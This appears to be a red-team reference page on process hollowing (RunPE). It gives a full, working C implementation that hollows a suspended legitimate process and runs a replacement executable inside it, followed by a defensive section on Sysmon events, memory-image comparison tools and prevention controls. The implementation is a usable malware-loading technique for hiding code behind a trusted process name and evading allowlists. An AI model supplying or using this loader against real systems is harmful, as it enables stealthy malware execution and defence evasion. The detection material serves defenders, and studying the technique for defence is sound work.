# Process Hollowing (RunPE)

**MITRE ATT&CK**: T1055.012 - Process Injection: Process Hollowing

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

Process hollowing creates a legitimate process in a SUSPENDED state, unmaps (hollows out)
its original executable image from memory, and replaces it with a different PE (Portable
Executable) image. When the process resumes, it executes the replacement code while
appearing to be the original legitimate process in task manager and process listings.

This technique is particularly effective for evading process-name-based allowlists because
the hollowed process retains the original process's name, path, and PID.

## High-Level Flow

```
CreateProcess(SUSPENDED)
    --> NtUnmapViewOfSection (remove original image)
    --> VirtualAllocEx (allocate space for replacement PE)
    --> Parse PE headers of replacement image
    --> Write PE headers + each section to remote process
    --> Update PEB->ImageBaseAddress to new base
    --> SetThreadContext (set RIP to new entry point)
    --> ResumeThread (execute replacement image)
```

## PE Header Structures

```c
/*
 * Understanding PE structure is essential for process hollowing.
 * The replacement image must be parsed and mapped section-by-section.
 */

// DOS Header - first structure at the start of any PE file
typedef struct _IMAGE_DOS_HEADER {
    WORD  e_magic;     // "MZ" signature (0x5A4D)
    // ... 29 other fields (mostly legacy) ...
    LONG  e_lfanew;    // Offset to IMAGE_NT_HEADERS (PE signature)
} IMAGE_DOS_HEADER;

// NT Headers - contains PE signature, file header, and optional header
typedef struct _IMAGE_NT_HEADERS64 {
    DWORD                   Signature;      // "PE\0\0" (0x00004550)
    IMAGE_FILE_HEADER       FileHeader;     // Machine type, section count, etc.
    IMAGE_OPTIONAL_HEADER64 OptionalHeader; // Entry point, image base, section alignment
} IMAGE_NT_HEADERS64;

// Key fields in IMAGE_OPTIONAL_HEADER64:
//   AddressOfEntryPoint  - RVA of the executable's entry point
//   ImageBase            - Preferred load address
//   SizeOfImage          - Total size when mapped in memory
//   SizeOfHeaders        - Size of all headers (DOS + NT + section headers)
//   SectionAlignment     - Alignment of sections in memory
//   FileAlignment        - Alignment of sections on disk

// Section Header - describes each section (.text, .data, .rdata, etc.)
typedef struct _IMAGE_SECTION_HEADER {
    BYTE  Name[8];              // Section name (e.g., ".text\0\0\0")
    union {
        DWORD PhysicalAddress;
        DWORD VirtualSize;      // Size of section in memory
    } Misc;
    DWORD VirtualAddress;       // RVA where section is mapped
    DWORD SizeOfRawData;        // Size of section on disk
    DWORD PointerToRawData;     // File offset to section data
    // ... relocations, line numbers, characteristics ...
    DWORD Characteristics;      // Flags: executable, readable, writable
} IMAGE_SECTION_HEADER;
```

## C Implementation

```c
#include <windows.h>
#include <winternl.h>  // For PEB structures and NtUnmapViewOfSection
#include <stdio.h>

// NtUnmapViewOfSection is not in kernel32 -- resolve from ntdll
typedef NTSTATUS(NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

int hollow_process(const char *targetPath, unsigned char *pePayload, SIZE_T peSize) {

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // ---------------------------------------------------------------
    // STEP 1: Create the target (legitimate) process in SUSPENDED state.
    // The process image is loaded but the main thread has not started.
    // ---------------------------------------------------------------
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] CreateProcess failed: %lu\n", GetLastError());
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 2: Read the PEB to find the current image base address.
    // The PEB (Process Environment Block) is at a fixed offset from
    // the TEB. We read it using NtQueryInformationProcess or by
    // reading the target's PEB address from PROCESS_BASIC_INFORMATION.
    // ---------------------------------------------------------------
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // On x64, PEB address is in Rdx register after process creation
    // PEB->ImageBaseAddress is at offset 0x10
    DWORD64 pebAddress = ctx.Rdx;
    DWORD64 originalImageBase;
    ReadProcessMemory(pi.hProcess,
        (LPCVOID)(pebAddress + 0x10),  // PEB->ImageBaseAddress
        &originalImageBase, sizeof(DWORD64), NULL);

    // ---------------------------------------------------------------
    // STEP 3: Unmap the original executable image.
    // NtUnmapViewOfSection removes the mapped PE from the target's
    // address space. After this, the process is "hollow."
    // ---------------------------------------------------------------
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

    NtUnmapViewOfSection(pi.hProcess, (PVOID)originalImageBase);

    // ---------------------------------------------------------------
    // STEP 4: Parse the replacement PE and allocate memory at the
    // same base address (or the PE's preferred ImageBase).
    // ---------------------------------------------------------------
    IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)pePayload;
    IMAGE_NT_HEADERS64 *ntHeaders = (IMAGE_NT_HEADERS64 *)
        (pePayload + dosHeader->e_lfanew);

    LPVOID newBase = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)ntHeaders->OptionalHeader.ImageBase,  // Preferred base
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // ---------------------------------------------------------------
    // STEP 5: Write PE headers to the remote process
    // ---------------------------------------------------------------
    WriteProcessMemory(pi.hProcess, newBase, pePayload,
        ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // ---------------------------------------------------------------
    // STEP 6: Write each PE section to its correct virtual address.
    // Sections are mapped at (newBase + section.VirtualAddress).
    // ---------------------------------------------------------------
    IMAGE_SECTION_HEADER *section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData > 0) {
            WriteProcessMemory(
                pi.hProcess,
                (LPVOID)((DWORD_PTR)newBase + section[i].VirtualAddress),
                pePayload + section[i].PointerToRawData,
                section[i].SizeOfRawData,
                NULL
            );
        }
    }

    // ---------------------------------------------------------------
    // STEP 7: Update the PEB's ImageBaseAddress to point to our new PE.
    // This ensures the loader and runtime reference the correct image.
    // ---------------------------------------------------------------
    WriteProcessMemory(pi.hProcess,
        (LPVOID)(pebAddress + 0x10),
        &ntHeaders->OptionalHeader.ImageBase,
        sizeof(DWORD64), NULL);

    // ---------------------------------------------------------------
    // STEP 8: Set the thread context to the new entry point and resume.
    // Entry point RVA + new image base = absolute entry point address.
    // ---------------------------------------------------------------
    ctx.Rcx = (DWORD64)newBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

## Detection & Prevention

### Suspended Process Analysis

**CREATE_SUSPENDED pattern**: A process created in suspended state that never executes
its legitimate entry point is a primary indicator. Detection rules correlate:
- Process creation with CREATE_SUSPENDED flag (Sysmon Event ID 1 does not directly
  expose this, but ETW does)
- Short time between creation and resume
- Memory writes between creation and resume

### Memory vs Disk Image Comparison

**Image mismatch**: The most definitive detection for hollowing is comparing the
in-memory image with the on-disk executable. If `svchost.exe` is running but its
.text section in memory does not match the .text section on disk, it has been hollowed.

Tools and techniques for this comparison:
- **Volatility `malfind` plugin**: Scans for memory regions with PAGE_EXECUTE_READWRITE
  that do not correspond to mapped files.
- **Pe-sieve / Hollows Hunter**: Dedicated tools that compare in-memory PE images
  against their on-disk counterparts.
- **VAD (Virtual Address Descriptor) analysis**: The VAD tree in kernel memory shows
  memory region types. A hollowed process will have private (non-image) memory where
  the main executable should be an image-backed mapping.

### Hollowed Process Indicators

1. **NtUnmapViewOfSection cross-process**: A process unmapping a section in another
   process is extremely rare in legitimate operation. ETW events from the
   Microsoft-Windows-Threat-Intelligence provider capture this.

2. **PEB ImageBaseAddress modification**: Writing to the PEB of a remote process is a
   high-fidelity indicator. Very few legitimate operations modify another process's PEB.

3. **Entry point in non-image memory**: After hollowing, the entry point RIP points to
   memory allocated with VirtualAllocEx rather than a proper image mapping. Stack
   trace analysis reveals this.

4. **Section permission anomalies**: The hollowed sections typically have
   PAGE_EXECUTE_READWRITE rather than the standard PAGE_EXECUTE_READ that
   properly loaded .text sections have.

### Sysmon Events

- **Event ID 1**: Process creation -- capture parent-child relationship
- **Event ID 10**: ProcessAccess with VM_WRITE to the suspended process
- **Event ID 25**: Process Tampering (available in newer Sysmon versions) --
  specifically designed to detect process hollowing and herpaderping

### Prevention

- **Windows Defender Application Control (WDAC)**: Enforces code integrity policies
  that validate PE images at load time.
- **Sysmon Event ID 25**: When configured, provides direct detection of tampering.
- **Protected Process Light**: Prevents the required handle access to protected processes.
- **Mandatory Integrity Control**: Processes cannot hollow processes at a higher
  integrity level.
- **Dynamic Code Prevention**: Processes with ACG enabled cannot execute from
  non-image-backed memory regions.
